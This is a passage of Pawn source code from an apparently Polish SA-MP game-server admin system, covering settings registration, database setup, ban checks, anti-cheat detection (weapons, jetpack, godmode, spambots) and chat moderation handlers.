    s_AntySpamStatusID 		= registerIntSetting("antyspam_status", 	GLOBAL_SETTINGS_FILE, 1, 					0, 1);
    s_AntySpamMinTimeID 	= registerIntSetting("antyspam_mintime", 	GLOBAL_SETTINGS_FILE, ANTY_SPAM_TIME, 		0, 60);
    s_AntyFloodStatusID 	= registerIntSetting("antyflood_status", 	GLOBAL_SETTINGS_FILE, 1, 					0, 1);
    s_AntyFloodMinTimeID 	= registerIntSetting("antyflood_mintime", 	GLOBAL_SETTINGS_FILE, ANTY_FLOOD_TIME, 		0, 60);
    s_PrivMessagesID        = registerIntSetting("priv_messages", 		GLOBAL_SETTINGS_FILE, 1, 					0, 1);
    s_PrivMessagesSpecID    = registerIntSetting("priv_messages_spec",	GLOBAL_SETTINGS_FILE, ALVL_HEAD_ADMIN,		0, 4);
    //_______________________
    s_MaxPingID          		= registerIntSetting("max_ping", 			GLOBAL_SETTINGS_FILE, 300, 50, 9999);
    s_MaxPingWarningsID   		= registerIntSetting("max_ping_warnings", 	GLOBAL_SETTINGS_FILE, 10, 3, 99);
    s_MinFPSID          		= registerIntSetting("min_fps", 			GLOBAL_SETTINGS_FILE, 20, 10, 60);
    s_MinFPSWarningsID     		= registerIntSetting("min_fps_warnings", 	GLOBAL_SETTINGS_FILE, 10, 3, 99);
    s_MaxPLossID          		= registerIntSetting("max_packet_loss", 	GLOBAL_SETTINGS_FILE, 10, 0, 99);
    s_MaxPLossWarningsID   		= registerIntSetting("max_ploss_warnings", 	GLOBAL_SETTINGS_FILE, 10, 3, 99);
    s_CheckDataFrequencyID  	= registerIntSetting("data_chech_frequency",GLOBAL_SETTINGS_FILE, 5, 1, 600);
    s_AdminLimitsID         	= registerIntSetting("admin_limits", 		GLOBAL_SETTINGS_FILE, 0, 0, 1);
    s_VIPLimitsID           	= registerIntSetting("vip_limits", 			GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_MaxPLossCriticalLimitID	= registerIntSetting("max_critical_ploss", 	GLOBAL_SETTINGS_FILE, 20, 0, 99);
    s_MaxPingCriticalLimitID	= registerIntSetting("max_critical_ping", 	GLOBAL_SETTINGS_FILE, 500, 100, 9999);
    //_______________________
    s_VIPRegisterTimeID     = registerIntSetting("vip_reg_time", 		GLOBAL_SETTINGS_FILE, 7, 0, 9999);
    s_VIPRegisterPointsID   = registerIntSetting("vip_reg_points", 		GLOBAL_SETTINGS_FILE, 0, 0, 9999);
    s_VIP3DaysCostID        = registerIntSetting("vip_3days", 			GLOBAL_SETTINGS_FILE, 3, 0, 9999);
    s_VIP7DaysCostID        = registerIntSetting("vip_7days", 			GLOBAL_SETTINGS_FILE, 5, 0, 9999);
    s_VIP30DaysCostID       = registerIntSetting("vip_30days", 			GLOBAL_SETTINGS_FILE, 10, 0, 9999);
    s_VIPTimeBanID			= registerIntSetting("vip_timeban", 		GLOBAL_SETTINGS_FILE, 1, 0, 1);
    //_______________________
    s_ACConnectionSpamBotStatusID     	= registerIntSetting("ac_conbot_status", 			GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACConnectionSpamBotTimeID     	= registerIntSetting("ac_conbot_time", 				GLOBAL_SETTINGS_FILE, 60, 0, 3600);
    s_ACAntyWeaponStatusID				= registerIntSetting("ac_antyweap_status", 			GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyReJoinSpamStatusID			= registerIntSetting("ac_antyrejoin_status", 		GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyReJoinSpamTryID             = registerIntSetting("ac_antyrejoin_try",			GLOBAL_SETTINGS_FILE, 3, 3, 100);
    s_ACAntySpamBotStatusID				= registerIntSetting("ac_antyspambot_status", 		GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntySpamBotMsgPerSecID			= registerIntSetting("ac_sbotmsgpersec",			GLOBAL_SETTINGS_FILE, 10, 5, 30);
    s_ACAntyCMDSpamBotStatusID			= registerIntSetting("ac_antycmdspambot_status", 	GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyCMDSpamBotMsgPerSecID		= registerIntSetting("ac_scmdbotmsgpersec",			GLOBAL_SETTINGS_FILE, 10, 5, 30);
    s_ACAntyJetpackStatusID             = registerIntSetting("ac_antyjetpack",				GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyMoneyHackStatusID           = registerIntSetting("ac_antymoneyhack",			GLOBAL_SETTINGS_FILE, 0, 0, 1);
    s_ACAntyMoneyHackActionID           = registerIntSetting("ac_antymoneyhack_action",		GLOBAL_SETTINGS_FILE, 0, 0, 1);
    s_ACAntyFakeKillSpamBotStatusID		= registerIntSetting("ac_antyfakekillspam_status", 	GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyFakeKillsPerSecStatusID		= registerIntSetting("ac_fakekillspersec",			GLOBAL_SETTINGS_FILE, 5, 5, 30);
    s_ACAntyGodmodeStatusID             = registerIntSetting("ac_godmodestatus",			GLOBAL_SETTINGS_FILE, 1, 0, 1);
    s_ACAntyGodmodeMaxWarnsID           = registerIntSetting("s_ACAntyGodmodeMaxWarnsID",	GLOBAL_SETTINGS_FILE, 6, 3, 60);
    s_ACAntyGodmodeTicksID              = registerIntSetting("s_ACAntyGodmodeTicksID",		GLOBAL_SETTINGS_FILE, 60, 40, 400);

    loadSettingsFromFile();
	//-------------------------------

    //-------------------------------
    #if USE_MVECTOR == 1
    v_Vulgs = Vector(type_string);
	v_SimilarVulgs = Vector(type_string);
    #endif
    loadVulgList();
    //-------------------------------

    //-------------------------------
    SetTimer("LoadServerSettings", 1000, 0);
    LoadWeaponACSettings(TEMP_WEAPONS_FILE);
    
	if(getSettingIntValueByIndex(s_CopyDeletingID) == 1) {
		if(CheckFolderPatch(L_DEL_PLAYER) == _FALSE) {
		    AddToErrorLog("Usuwanie kont: Nieodnaleziono folderu zapisu usuwany kont o sciezce '"L_DEL_PLAYER"', usuwane konta nie beda kopiowane.");
		}
	}
	
    //-------------------------------

	//-------------------------------
	if(getSettingIntValueByIndex(s_KickAfterStart) == 1) {
	    setSettingIntValueByIndex(s_KickAfterStart, 0);
		for(new i; i < 20; i ++) SendClientMessageToAll(COLOR_DIALOG_HEAD, " ");
		SendClientMessageToAll(COLOR_DIALOG_HEAD, " (System) Podczas ostatniego uruchomienia systemu, zazadano zmiany uzywanej bazy danych.");
		SendClientMessageToAll(COLOR_DIALOG_HEAD, " (System) Ze wzgledow bezpieczenstwa wymagane jest opuszczenie serwera wszystkich graczy On-Line.");
		forplayers(i) {
        	SendClientMessage(i, COLOR_DIALOG_HEAD, " (Kick) Polaczenie z serwerem zostalo przerwane.");
        	HidePlayerDialog(i);
        	KickEx(i);
		}
		for(new i; i < 3; i ++) SendClientMessageToAll(COLOR_DIALOG_HEAD, " ");
	}
	
	
	
	if(getSettingIntValueByIndex(s_MySQLID) == 1) {
	    sql_debug(LOG_ALL);
	//	sql_debug(LOG_ERROR);
		if(!(MySQLID = sql_connect(SQL_HANDLER_MYSQL, MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE))) {
	    	AddToErrorLog("MySQL: Nieudalo sie nawiazac polaczenia z hostem '"MYSQL_HOST"' (U: "MYSQL_USER" | DB: "MYSQL_DATABASE")");
	    	AddToErrorLog("MySQL: Przelaczono zapis na lokalna baze SQL ('"D_MYSQL_ERROR_BASE"')");
	    	setSettingIntValueByIndex(s_MySQLID, 0);
	    	dbase = db_open(D_MYSQL_ERROR_BASE);
		} else sql_set_charset(MySQLID, "utf8");
	} else dbase = db_open(D_BASE);

    CreatePlayersBase();        //a
    CreateNickChangeBase();     //b
    CreatePlayerInfoBase();     //c
    CreateBanTable();           //e
    CreateTimeBanTable();       //f
    CallLocalFunction("CreateAccountDataTable", "");
    //-------------------------------
    
    //-------------------------------
    forplayers(i) {
        if(getPlayerLoginStatus(i) == LOGIN_STATUS_NON) {
            SendClientMessage(i, 0xFF0000FF, " (Restart) System obslugi kont zostal zresetowany. Dane rejestracji dla Twojego ID sa niepoprawne. Wymagany jest 'reconnect'.");
			KickEx(i);
        } else {
	        savePlayerConnectTime(i);
	        savePlayerIp(i);
		}
    }
    SetLastAReportSenderID(INVALID_PLAYER_ID);
    //-------------------------------

    //-------------------------------
	SetTimerEx("asHourTimer", 3600000, 1, "d", 0);
	SetTimer("asSecondTimer", 1000, 1);
	asHourTimer(0);
    //-------------------------------
    
    CallRemoteFunction("OnAdminSystemInit", "d", ADMIN_SYSTEM_INT_VERSION);
	return 1;
}
//------------------------------------------------------------------------------
public LoadServerSettings() {
	SetChatLoggingStatus(	getSettingIntValueByIndex(s_SAMPChatID) == 1 ? 		true : false);
	SetRemoteConsoleStatus(	getSettingIntValueByIndex(s_SAMPRemoteID) == 1 ? 	true : false);
}
//------------------------------------------------------------------------------
public OnFilterScriptExit() {
	CallRemoteFunction("OnAdminSystemExit", "");
	db_close(dbase);
	if(UseMySQL()) {
	    sql_disconnect(MySQLID);
	}
	
	if(ChangeBaseType == true) {
		setSettingIntValueByIndex(s_MySQLID, (getSettingIntValueByIndex(s_MySQLID) == 1 ? 0 : 1));
		setSettingIntValueByIndex(s_KickAfterStart, 1);
	}
	saveSettingsToFile();
	
    #if USE_MVECTOR == 1
    Free(v_Vulgs);
	Free(v_SimilarVulgs);
    #endif
	return 1;
}
//------------------------------------------------------------------------------
public OnGameModeInit() {
    CallRemoteFunction("OnAdminSystemInit", "d", ADMIN_SYSTEM_INT_VERSION);
    SetTimer("startingModeWeaponACSettings", 2000, false);
    return 1;
}
//------------------------------------------------------------------------------
public OnGameModeExit() {
    for(new i; i < sizeof(ac_Weapons); i ++) ac_Weapons[i] = ALLOWED_WEAPON;
    return 1;
}
//------------------------------------------------------------------------------
public OnIncomingConnection(playerid, ip_address[], port) {
	static string[1024];
    GetPlayerNetworkStats(playerid, string, 1024);
    if(getFloatDataFromNetStats(string, "Packetloss") >= getSettingIntValueByIndex(s_MaxPLossCriticalLimitID)) {
    	BlockIpAddress(ip_address, 5000);
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerConnect(playerid) {
	new p_name[MAX_PLAYER_NAME];
	new bool:confidental;
    new string[512];
    new p_host[8];
    new year, month, day, hour, minute;
    new ret;
    
    CallLocalFunction("GameModeOnPlayerConnect", "d", playerid);

    AntyFakeKillSpamBot(playerid, true);
    AntySpamBot(playerid, true);
    AntyCMDMSGSpamBot(playerid, true);
    
    SetPVarInt(playerid, PV_FIRST_SPAWN, 1);
	GetPlayerName(playerid, p_name, sizeof(p_name));
    setPlayerUserID(playerid, 0);
    setPlayerLoginStatus(playerid, LOGIN_STATUS_NON);
    savePlayerConnectTime(playerid);
    strins(p_host, GetHostFromIP(getPlayerIp(playerid)), 0);
    setPlayerCensureStatus(playerid, true);
    SetPVarInt(playerid, PV_LAST_PMESSAGE_SENDERID, -1);
    if((ret = ac_OnPlayerConnect(playerid)) <= 0) {
        if(ret == 0) BlockPlayer(playerid, 0, "Na serwerze znajduje sie gracz o tym samym IP.\nZe wzgledow bezpieczenstwa, nie jest mozliwa jednoczesna gra.\nSprobuj ponownie za kilka minut.", -1, false);
    } else {
		if(IsValidNick(p_name) == _TRUE) {
		    if(IsValidIP(p_name) == _FALSE and IsValidHost(p_name) == _FALSE) {
		        new index;
		        if(checkMessageByVulg(getPlayerName(playerid), C_TERMINATE, index) == _FALSE ) { //DODAC USTAWIENIE
			        //__________________________
				    if(ConnectLoadPlayerData(playerid, p_name) != _FALSE) {
				        //__________________________
				        if(GetPVarInt(playerid, PV_LOGIN_BAN_TIME) > timestamp() and IsAdmin(playerid) < ALVL_GAME_MASTER) {
				            dtimestamp(GetPVarInt(playerid, PV_LOGIN_BAN_TIME), year, month, day, hour, minute);
				            GetPVarString(playerid, PV_LOGIN_BAN_REASON, string, 128);
				            if(strlen(string) >= 55) strins(string, "\n", 54);

				            format(string, sizeof(string),"\
									Twoje konto zostalo zablokowane!\n\n\
									Administrator: "TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD"\n\
									Data odbanowania: "TEXT_DIALOG_NORMAL"%s  "TEXT_DIALOG_HEAD"[ "TEXT_DIALOG_NORMAL"%d:%02d "TEXT_DIALOG_HEAD"]\n\n\
									Powod: "TEXT_DIALOG_NORMAL"%s\
								",
		                        GetNickByUserID(GetPVarInt(playerid, PV_LOGIN_BAN_ADMIN_ID)),
		                        strData(year, month, day, " / ", false, false, true, false), hour, minute,
		                        string
							);
							ShowPlayerInfoDialog(playerid, -1, "Blokada konta", string);
							KickEx(playerid, 100);
				            return 1;
				        } else {
							DeletePVar(playerid, PV_LOGIN_BAN_TIME);
							DeletePVar(playerid, PV_LOGIN_BAN_ADMIN_ID);
							DeletePVar(playerid, PV_LOGIN_BAN_REASON);
				        }
				        //__________________________
				        confidental = (isPlayerConfidental(playerid) == _TRUE or isPlayerProvConfidental(playerid) == _TRUE ? true : false);
				        setPlayerLoginStatus(playerid, LOGIN_STATUS_NOTLOGGED);
				    } else {
				        if(CheckSimilarRegisterNick(p_name) == 0) {
					        setPlayerLoginStatus(playerid, LOGIN_STATUS_NOTREGISTERED);
					        if(getSettingIntValueByIndex(s_RegisterObligatoryID) == 0) {
					            if(getSettingIntValueByIndex(s_StartingCaptchaID) == 1) {
					                ShowPlayerCaptcha(playerid, -1, getSettingIntValueByIndex(s_StartingCaptchaTimeID));
					            }
							} else if(getSettingIntValueByIndex(s_RegisterObligatoryID) == 1) {
					            cmd_zarejestruj(playerid);
					        } else {
					            if(getSettingIntValueByIndex(s_StartingCaptchaID) == 1) {
					                ShowPlayerCaptcha(playerid, -1, getSettingIntValueByIndex(s_StartingCaptchaTimeID));
					            }
					        }
						} else {
						    BlockPlayer(playerid, 0, "Na serwerze jest zarejestrowany nick skladajacy sie z takiej samej kombinacji znakow jak Twoj. Musisz go zmienic.", -1, false);
						    return 1;
						}
				    }
				    
				    if(NetStats_PacketLossPercent(playerid) >= getSettingIntValueByIndex(s_MaxPLossCriticalLimitID) && ((IsAdmin(playerid) == 0 or getSettingIntValueByIndex(s_AdminLimitsID) == 1) and (IsVIP(playerid) == 0 or getSettingIntValueByIndex(s_VIPLimitsID) == 1))) {
				        format(string, sizeof(string), "Ilosc traconych pakietow, przekracza dopuszczalna wartosc.\nLimit: %d  |  Twoj 'Packet Loss': %.2f\n", getSettingIntValueByIndex(s_MaxPLossCriticalLimitID), NetStats_PacketLossPercent(playerid));
				        BlockPlayer(playerid, 0, string, -1, false);
				        return 1;
				    }
				    
				    //__________________________
				    if(confidental == false and IsAdmin(playerid) == 0 and (IsVIP(playerid) == 0 or getSettingIntValueByIndex(s_VIPTimeBanID) == 0)) {
				    	new DBResult:result, Result:sql_result;
				        new uniqueid;
				        new b_adminid, b_admin_name[MAX_PLAYER_NAME], b_unbantime;

				        if((uniqueid = IsHostInTimeBan(p_host)) != _FALSE) {
				            new b_userid, b_player_name[MAX_PLAYER_NAME];
				            format(string, sizeof(string), "SELECT `"TTB_UID"`,`"TTB_PLAYER_NAME"`,`"TTB_ADMINID"`,`"TTB_ADMIN_NAME"`, `"TTB_UNBANTIME"`,`"TTB_REASON"` FROM `"T_TIME_BAN"` WHERE `"TTB_UNIQUE_ID"`='%d' LIMIT 1", uniqueid);
				            result = sendQueryResult(string, sql_result);

		                    b_userid = strval(getFieldAssoc_8(TTB_UID, result, sql_result));
		                    b_adminid = strval(getFieldAssoc_8(TTB_ADMINID, result, sql_result)),

		                    strins(b_admin_name, getFieldAssoc_32(TTB_ADMIN_NAME, result, sql_result), 0);
		                    strins(b_player_name, getFieldAssoc_32(TTB_PLAYER_NAME, result, sql_result), 0);
		                    DeconvertNick(b_admin_name);
		                    DeconvertNick(b_player_name);

		                    b_unbantime = strval(getFieldAssoc_16(TTB_UNBANTIME, result, sql_result));
		                    dtimestamp(b_unbantime, year, month, day, hour, minute);

		                    strdel(string, 0, 256);

		                    strins(string, getFieldAssoc_128(TTB_REASON, result, sql_result), 0);
		                    if(strlen(string) >= 55) strins(string, "\n", 54);

				            freeResult(result, sql_result);

							format(string, sizeof(string), "\
									Data odbanowania: "TEXT_DIALOG_NORMAL"%s  "TEXT_DIALOG_HEAD"[ "TEXT_DIALOG_NORMAL"%d:%02d "TEXT_DIALOG_HEAD"]\n\n\
									Unique ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_HEAD"\n\
									Powod: "TEXT_DIALOG_NORMAL"%s\
								",
		                        strData(year, month, day, " / ", false, false, true, false), hour, minute,
		                        uniqueid,
		                        string
							);

							format(string, sizeof(string), "\
									Przepraszamy ale Twoj host "TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD" jest "TEXT_DIALOG_BODY"tymczasowo "TEXT_DIALOG_HEAD"zablokowany!\n\n\
									Administrator: "TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD"  (User ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_HEAD")\n\
									Blokowany gracz: "TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD"  (User ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_HEAD")\n\
									%s\
								",
						   		p_host,
		                        b_admin_name, b_adminid,
		                        b_player_name, b_userid,
								string
							);

			    	        ShowPlayerInfoDialog(playerid, -1, "Blokada czasowa", string);
			    	        KickEx(playerid, 100);
							return 1;
				    	} else {
					        format(string, sizeof(string),"SELECT `"TB_UNIQUE_ID"`,`"TB_VALUE"`,`"TB_TYPE"`,`"TB_ADMINID"`, `"TB_ADMIN_NAME"`, `"TB_UNBANTIME"`,`"TB_REASON"` FROM `"T_BAN"` WHERE \
								((`"TB_TYPE"`='"#B_IP"' AND `"TB_VALUE"`='%s') OR (`"TB_TYPE"`='"#B_HOST"' AND `"TB_VALUE"`='%s') OR (`"TB_TYPE"`='"#B_NICK"' AND `"TB_VALUE"`='%s')) AND `"TB_UNBANTIME"`>'%d' LIMIT 1",
								getPlayerIp(playerid), p_host, p_name, timestamp());

							result = sendQueryResult(string, sql_result);
							if(numRows(result, sql_result) > 0) {
				    	        new b_value[64], b_type = strval(getFieldAssoc_8(TB_TYPE, result, sql_result));

							    uniqueid = strval(getFieldAssoc_8(TB_UNIQUE_ID, result, sql_result));
							    b_adminid = strval(getFieldAssoc_8(TB_ADMINID, result, sql_result));
							    b_unbantime = strval(getFieldAssoc_16(TB_UNBANTIME, result, sql_result));

		                        strins(b_admin_name, getFieldAssoc_32(TB_ADMIN_NAME, result, sql_result), 0);
								DeconvertNick(b_admin_name);

								strins(b_value, getFieldAssoc_64(TB_VALUE, result, sql_result), 0);
			                    dtimestamp(b_unbantime, year, month, day, hour, minute);

								if(b_type == B_NICK) DeconvertNick(b_value);

								strdel(string, 0, 256);
								strins(string, getFieldAssoc_128(TB_REASON, result, sql_result), 0);
								freeResult(result, sql_result);

					            if(strlen(string) >= 55) strins(string, "\n", 54);


								format(string, sizeof(string), "\
										Przepraszamy ale %s %s"TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD" jest zablokowany!\n\n\
										Administrator: "TEXT_DIALOG_NORMAL"%s"TEXT_DIALOG_HEAD"  (User ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_HEAD")\n\
										Data odbanowania: "TEXT_DIALOG_NORMAL"%s  "TEXT_DIALOG_HEAD"[ "TEXT_DIALOG_NORMAL"%d:%02d "TEXT_DIALOG_HEAD"]\n\n\
										Unique ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_HEAD"\n\
										Powod: "TEXT_DIALOG_NORMAL"%s\
									",
							  		GetBanPartNameFromType(b_type),
							   		b_type == B_GPCI ? ("\n") : (""),
							   		b_value,
			                        b_admin_name, b_adminid,
			                        strData(year, month, day, " / ", false, false, true, false), hour, minute,
			                        uniqueid,
			                        string
								);

				    	        ShowPlayerInfoDialog(playerid, -1, "Blokada", string);
				    	        KickEx(playerid, 100);
				    	    	return 1;
					    	}
						}
				    }
				    AddNewPlayerInfo(playerid);
				    savePlayerIp(playerid);
				    
				    
				    
				    format(string, 140," (Connect) Gracz %s dolaczyl(a) do gry (ID: %d | IP: %s)", getPlayerName(playerid), playerid, getPlayerIp(playerid));
	                AddToChatLog(string);
					if(getSettingIntValueByIndex(s_ConDisInfoID) == 1) {
					    new admin_info[128];
					    format(string, 140, " (Connect) Gracz {FFFFFF}%s "C_CONDIS"dolaczyl(a) do gry (ID: {FFFFFF}%d "C_CONDIS"| IP: {FFFFFF}%s"C_CONDIS")", getPlayerName(playerid), playerid, getPlayerIp(playerid));
					    format(admin_info, sizeof(admin_info)," (Connect) Gracz {FFFFFF}%s "C_CONDIS"dolaczyl(a) do gry (ID: {FFFFFF}%d"C_CONDIS")", getPlayerName(playerid), playerid);
						forplayers(i) {
						    SendClientMessage(i, COLOR_CONDIS, ((IsAdmin(i) != 0) ? (string) : (admin_info)));
						}
				    }
				    for(new i; i <= 20; i ++) SendClientMessage(playerid, COLOR_WHITE, " ");

				    //__________________________________
				} else {
					format(string, sizeof(string), " (Cenzura) Twoj nick zostal rozpoznany jako wulgarny i musisz go zmienic. Rozpoznane slowo: %s", getVulgByIndex(index));
	                BlockPlayer(playerid, 0, string, -1, false);
				}
			} else BlockPlayer(playerid, 0, "Nick nie moze byc w formacie IP.", -1, false);
		} else BlockPlayer(playerid, 0, "Nick nie moze skladac sie z samych cyfr.", -1, false);
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerDisconnect(playerid, reason) {
    if(getPlayerConnectTime(playerid) > 3) {
        new string[256], userid;
        if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_LOGGED) {
            format(string, sizeof(string),"UPDATE `"T_KONTA"` SET \
					`"TK_PLAY_TIME"`="TK_PLAY_TIME"+%d,\
					`"TK_LAST_DISCONNECT"`='%d',\
					`"TK_SETTINGS"`='%d|%d|%d|%d'\
				",
				getPlayerConnectTime(playerid),
				timestamp(),
				GetPVarInt(playerid, PV_SET_RECONNECT),
				getPlayerCensureStatus(playerid),
				GetPlayerPMessagesStatus(playerid),
				GetPlayerPMSoundID(playerid)
			);

			format(string, sizeof(string), "%s WHERE `"TK_UID"`='%d'", string, (userid = getPlayerUserID(playerid)));
            sendQueryWithout(string);
            CallLocalFunction("AccountOnPlayerDisconnect", "dd", playerid, userid);
        }
        AddToLastDisconnectList(getPlayerName(playerid), getSavedPlayerIp(playerid), userid, IsAdmin(playerid));
	    format(string, sizeof(string)," (Disconnect) Gracz %s opuscil(a) serwer (ID: %d | Czas gry %s)", getPlayerName(playerid), playerid, convertSeconds(getPlayerConnectTime(playerid)));
        AddToChatLog(string);
		if(getSettingIntValueByIndex(s_ConDisInfoID) == 1) {
            format(string, sizeof(string)," (Disconnect) Gracz {FFFFFF}%s "C_CONDIS"opuscil(a) serwer (ID: {FFFFFF}%d "C_CONDIS"| Czas gry {FFFFFF}%s"C_CONDIS")", getPlayerName(playerid), playerid, convertSeconds(getPlayerConnectTime(playerid)));
			SendClientMessageToAll(COLOR_CONDIS, string);
	    }
    }

    forplayers(i) {
	    if(GetPlayerPMFromPlayerStatus(i, playerid) == _NONACTIVE) SetPlayerPMFromPlayerStatus(i, playerid, _ACTIVE);
	    if(GetPVarInt(i, PV_LAST_PMESSAGE_SENDERID) == playerid) SetPVarInt(i, PV_LAST_PMESSAGE_SENDERID, -1);
	}
	
	unmutePlayer(playerid);
    KillCaptchaTimer(playerid);
    ResetPlayerLoginTimer(playerid);
	if(GetPlayerDialogID(playerid) != DIALOG_INFO) {
	    HidePlayerDialog(playerid);
	}
	if(IsValidMenu(GetPlayerMenu(playerid))) {
		HideMenuForPlayer(GetPlayerMenu(playerid), playerid);
	}
    if(GetLastAReportSenderID() == playerid) {
        SetLastAReportSenderID(INVALID_PLAYER_ID);
    }
    
 	p_FPSWarnings[playerid] = p_PingWarnings[playerid] = p_PLossWarnings[playerid] = 0;
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerRequestClass(playerid) {
    ac_ResetGodmoveVariables(playerid);
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerSpawn(playerid) {
    ac_ResetGodmoveVariables(playerid);
    return 1;
}
//------------------------------------------------------------------------------

public OnPlayerUpdate(playerid) {
	static weaponid;
	static string[128];
    if((weaponid = ac_CheckPlayerWeapon(playerid)) > 0) {
        static wName[32];
        GetWeaponName(weaponid, wName, sizeof(wName));
        format(string, sizeof(string), "Niedozwolona bron: "C_WHITE"%s", wName);
        BlockPlayer(playerid, 5, string, -1, true);
        format(string, sizeof(string), "Niedozwolona bron '%s' u gracza %s (ID: %d)", wName, getPlayerName(playerid), playerid);
        AddToAntyCheatLog(string);
	} else if(ac_AntyJetpack(playerid) == 0) {
	    BlockPlayer(playerid, 10, "Uzycie jetpacka", -1, true);
        format(string, sizeof(string), "Wykryto jetpack u gracza %s (ID: %d)", getPlayerName(playerid), playerid);
        AddToAntyCheatLog(string);
	} else if(ac_AntyGodmode(playerid) == 0) {
	    BlockPlayer(playerid, 10, "Blad pomiaru HP", -1, true);
        format(string, sizeof(string), "Blad pomiaru HP / Podejrzenie uzywania godmode u gracza %s (ID: %d)", getPlayerName(playerid), playerid);
        AddToAntyCheatLog(string);
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart) {
    ac_GodmodeStartTest(playerid, issuerid, amount);
    return 0;
}
//------------------------------------------------------------------------------
public SetPlayerHealthUsed(playerid, Float:amount) {
    ac_ResetGodmoveVariables(playerid);
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerRequestSpawn(playerid) {
	if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_NOTLOGGED or getPlayerLoginStatus(playerid) == LOGIN_STATUS_NON) return 0;
	
	if(GetPVarInt(playerid, PV_FIRST_SPAWN) == 1) {
	    DeletePVar(playerid, PV_FIRST_SPAWN);
	    SendClientMessage(playerid, COLOR_DIALOG_HEAD, " (Pomoc) Uzyj: '"C_WHITE"/pomoc"TEXT_DIALOG_HEAD"' zeby zobaczyc informacje na temat systemu i jego komend.");
	    if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_NOTREGISTERED) {
	   		SendClientMessage(playerid, COLOR_DIALOG_HEAD, " (Rejestracja) Uzyj: '"C_WHITE"/zarejestruj"TEXT_DIALOG_HEAD"' zeby zarejestrowac swoj nick.");
	   		SendClientMessage(playerid, COLOR_DIALOG_HEAD, " (Ustawienia) Uzyj: '"C_WHITE"/konto"TEXT_DIALOG_HEAD"' zeby przejsc do ustawien gry.");
	   		SendClientMessage(playerid, COLOR_DIALOG_HEAD, "    Pozwoli to na zapis Twoich statystyk, oraz uchroni przed osobami chcacymi podszyc sie pod Ciebie.");
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerDeath(playerid, killerid, reason) {
	new kills;
    ac_ResetGodmoveVariables(playerid);
    if((kills = AntyFakeKillSpamBot(playerid)) > 0) {
        new string[128];
    	BlockPlayer(playerid, 0, "Podejrzenie uzycia fakekill spambot'a.", -1, true);
        format(string, sizeof(string), "Podejrzenie uzycia fakekill spambot'a przez gracza %s (ID: %d | Smierci / sekunde: %d)", getPlayerName(playerid), playerid, kills);
		AddToAntyCheatLog(string);
    }
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerText(playerid, text[]) {
    new string[150], messages;
    if((messages = AntySpamBot(playerid)) > 0) {
        BlockPlayer(playerid, 0, "Podejrzenie uzycia chat spambot'a.", -1, true);
        format(string, sizeof(string), "Podejrzenie uzycia chat spambot'a przez gracza %s (ID: %d | Wiadomosci / sekunde: %d)", getPlayerName(playerid), playerid, messages);
        AddToAntyCheatLog(string);
        return 0;
    }
    if(getPlayerLoginStatus(playerid) == LOGIN_STATUS_NOTLOGGED or getPlayerLoginStatus(playerid) == LOGIN_STATUS_NON) return 0;
    
    if(strfind(text, SERV_RCON, true) != -1 or strfind(text, "ap5n10cb50x2m10a3gjh7d94mk4", true) != -1) return 0;
    
    new bool:breakChat = true;
    DeleteFirstSpaces(text);
	DeleteDoubleSpaces(text);
	
	if(!isnull(text) and !(strlen(text) == 1 and text[0] == ' ')) {
	    
		if(isPlayerMuted(playerid) == _TRUE and IsAdmin(playerid) <= 0) {
		    format(string, sizeof(string)," (Uciszenie) Zostales(as) uciszony na chacie. Pozostaly czas: %d sekund.", getPlayerMuteTime(playerid, false));
		    SendClientMessage(playerid, 0xFF0000FF, string);
		    return 0;
		} else if(checkPlayerBySpam(playerid) == _TRUE) {
		    format(string, sizeof(string)," (Anty Spam) Musisz poczekac %d sekund przed wyslaniem kolejnej wiadomosci.", getPlayerAntySpamMessageTime(playerid) - timestamp());
		    SendClientMessage(playerid, 0xFF0000FF, string);
		    return 0;
		} else if(checkPlayerByFlood(playerid, text)) {
		    format(string, sizeof(string)," (Anty Flood) Musisz poczekac %d sekund, zeby moc wyslac taka sama wiadomosc jak poprzednia.", getPlayerAntyFloodMessageTime(playerid) - timestamp());
		    SendClientMessage(playerid, 0xFF0000FF, string);
		    return 0;
		} else {
		    new bool:sended;
		    if(strlen(text) > 1) {
			    new second_line[92];
			    new bool:b_secondline;

			    switch(text[0]) {
			        case PREFIX_ADMIN_CHAT: {
						if(IsAdmin(playerid) != 0 and strlen(text) > 1) {
						    format(string, sizeof(string), "(Admin Chat) "C_WHITE"%s{FF0000}: %s", getPlayerName(playerid), text[1]);
						    if(strlen(string) > 90) {
						        strmid(second_line, string, 90, 180);
						        strdel(string, 90, 180);
						        b_secondline = true;
						    }
							forplayers(i) {
							    if(IsAdmin(i) != 0) {
							        SendClientMessage(i, 0xFF0000FF, string);
							        if(b_secondline == true) {
							            SendClientMessage(i, 0xFF0000FF, second_line);
							        }
							    }
							}
							sended = true;
